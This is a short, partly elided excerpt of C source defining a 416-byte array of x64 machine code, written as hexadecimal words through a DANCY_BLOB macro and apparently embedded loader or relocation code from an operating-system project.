...
const unsigned char x64[416] = {
	...
	DANCY_BLOB(0x8B6E,0x1081,0xE964,0x8604,0x0009,0xE975,0x408B,0x4310),
	...
	DANCY_BLOB(0x4883,0xE901,0x75CA,0xBEB4,0x0100,0x00EB,0x03F4,0xEBFD),
	...
	DANCY_BLOB(0x31C0,0x31C9,0x31D2,0x31ED,0x31F6,0x31FF,0x83C4,0x08C3),
	DANCY_BLOB(0x5356,0xB812,0x0000,0x0031,0xC98D,0x5C24,0x188B,0x7308),
	DANCY_BLOB(0x660B,0x4E08,0x7447,0x8B7E,0x04F7,0xE78B,0x3E03,0x7B04),
	DANCY_BLOB(0x8B73,0x0C8D,0x3406,0x8B46,0x0883,0xF902,0x7706,0x0107),
	DANCY_BLOB(0x721E,0xEB29,0x83F9,0x0375,0x092B,0x4304,0x0107,0x7210),
